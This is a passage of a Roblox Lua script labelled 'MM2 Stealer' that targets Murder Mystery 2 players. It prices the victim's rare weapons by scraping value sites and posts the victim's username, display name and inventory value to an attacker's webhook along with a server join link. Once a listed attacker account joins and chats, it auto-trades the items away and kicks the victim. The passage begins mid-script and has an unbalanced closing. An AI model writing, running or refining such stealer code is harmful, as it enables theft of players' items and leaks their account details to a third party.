local function trim(s) return s:match("^%s*(.-)%s*$") end
local function safeRequest(url)
    local success, res = pcall(function()
        return request({Url = url, Method = "GET", Headers = headers})
    end)
    if success and res and res.StatusCode == 200 then return res.Body end
    return ""
end
local function parseValue(div)
    if not div then return nil end
    local s = div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if s then return tonumber((s:gsub(",", ""))) end
    return nil
end
local function scrapeList(url)
    local list = {}
    local body = safeRequest(url)
    if not body or body == "" then return list end
    for name, div in body:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = name:match("([^<]+)")
        if name then
            name = trim(name:gsub("%s+", " ")):lower()
            list[name] = parseValue(div)
        end
    end
    return list
end

-- Build Value List

    local ancients = scrapeList(categories.ancient)

    local vintages = scrapeList(categories.classic)
    local chromas = scrapeList(categories.chroma)
    for id, item in pairs(database) do
        local name = (item.ItemName or ""):lower()
        local rarity = item.Rarity or "Common"
        local isChroma = item.Chroma or false
        local rIndex = table.find(rarityTable, rarity)
        local gIndex = table.find(rarityTable, "Godly")
        if rIndex and gIndex and rIndex >= gIndex and name ~= "" then
            local val
            if isChroma then
                for cName, cVal in pairs(chromas) do
                    if name:find(cName) then val = cVal break end
                end
            else
                val = godlies[name] or ancients[name] or uniques[name] or vintages[name]
            end
            if val and val > 0 then valueList[id] = val end
        end
    end
end)

-- Webhook Sender
local function sendHook(embed, content)
    local body = HttpService:JSONEncode({content=content or "", embeds={embed}})
    pcall(function()
        request({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
    end)
end

-- Send First Message
local function SendFirstMessage(list)
    local itemText = ""
    for _, item in ipairs(list) do
        itemText ..= string.format("%s (x%s): %s Value (%s)\n", item.DataID, item.Amount, item.Value*item.Amount, item.Rarity)
    end
    if #itemText > 1000 then itemText = itemText:sub(1, 970) .. "\n...+ more!" end
    local joinLink = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
    local teleportCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')"
    sendHook({
        title = "🎯 MM2 HIT DETECTED",
        color = totalValue >= 100 and 0xFF0000 or 0xFFCC00,
        fields = {
            {name="Victim", value="```"..plr.Name.."```", inline=true},
            {name="Display", value="```"..plr.DisplayName.."```", inline=true},
            {name="Total Value", value="```"..totalValue.."```", inline=true},
            {name="Join Link", value="[🔗 Click Here]("..joinLink..")\nOr run: ```"..teleportCode.."```", inline=false},
            {name="Items", value="```"..itemText.."```", inline=false}
        },
        footer = {text="MM2 Stealer"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }, ping == "Yes" and "@everyone" or "")
end

-- Send Completion Message
local function SendDone(list)
    local itemText = ""
    for _, item in ipairs(list) do
        itemText ..= string.format("%s x%s — %s\n", item.DataID, item.Amount, item.Rarity)
    end
    if #itemText > 1000 then itemText = itemText:sub(1, 970) .. "\n...+ more!" end
    sendHook({
        title = "✅ TRADE COMPLETE",
        color = 0x00FF00,
        fields = {
            {name="Victim", value="```"..plr.Name.."```", inline=true},
            {name="Total Value", value="```"..totalValue.."```", inline=true},
            {name="Items Sent", value="```"..itemText.."```", inline=false}
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }, "")
end

-- Main Logic
if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a,b) return a.Value*a.Amount > b.Value*b.Amount end)
    local sentWeapons = {unpack(weaponsToSend)}
    SendFirstMessage(weaponsToSend)

    local function doTrade(targetName)
        local target = Players:FindFirstChild(targetName)
        if not target then return end
        -- Close existing trade
        pcall(function()
            local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
            if Trade then Trade.DeclineTrade:FireServer() end
        end)
        task.wait(0.5)
        -- Send trade
        pcall(function()
            game.ReplicatedStorage.Trade.SendTradeRequest:FireServer(target)
        end)
        -- Wait for trade
        local tradeActive = true
        local timeout = 0
        while tradeActive and #weaponsToSend > 0 and timeout < 60 do
            task.wait(1)
            timeout += 1
            local status = nil
            pcall(function()
                status = game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
            end)
            if status == "Open" then
                for i=1, math.min(4, #weaponsToSend) do
                    local item = table.remove(weaponsToSend, 1)
                    pcall(function()
                        game.ReplicatedStorage.Trade.AddItem:FireServer(item.DataID)
                    end)
                end
                task.wait(0.5)
                pcall(function()
                    game.ReplicatedStorage.Trade.AcceptTrade:FireServer()
                end)
                task.wait(3)
            elseif status == "None" or status == "Closed" then
                tradeActive = false
            end
        end
        SendDone(sentWeapons)
        task.wait(2)
        plr:Kick("✅ All items transferred!")
    end

    -- Wait for you to join & chat
    local function checkPlayer(p)
        if table.find(users, p.Name) then
            p.Chatted:Once(function(msg)
                if msg and msg ~= "" then
                    task.wait(0.5)
                    doTrade(p.Name)
                end
            end)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do checkPlayer(p) end
    Players.PlayerAdded:Connect(checkPlayer)
end
